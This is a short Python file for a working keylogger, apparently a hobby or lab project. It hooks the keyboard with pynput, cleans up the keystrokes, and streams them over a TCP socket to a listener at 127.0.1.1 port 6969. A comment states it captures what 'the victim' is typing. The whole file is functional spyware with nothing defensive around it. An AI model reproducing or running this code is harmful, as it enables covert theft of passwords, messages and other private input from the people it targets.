import socket
from pynput.keyboard import Listener

# def main
def main():
    with socket.socket() as s:
        s.connect(("127.0.1.1", 6969))

        # listen to keyboard
        def listen_keyboard(key):
            keydata = str(key)
            keydata = keydata.replace("'", "")
            # converting some keydatas because in the logfile we would get things like "Key.enter" instead of a new line
            if keydata == 'Key.space':
                keydata = ' '
            if keydata == "Key.enter":
                keydata = "\n"
            elif "Key." in keydata:
                keydata = ""
            # encoding these data as bytes with the utf-8 format
            s.send(bytes(keydata, "utf-8"))

        # listen what the victim is typing
        with Listener(on_press=listen_keyboard) as l:
            l.join()


if __name__ == "__main__":
    main()
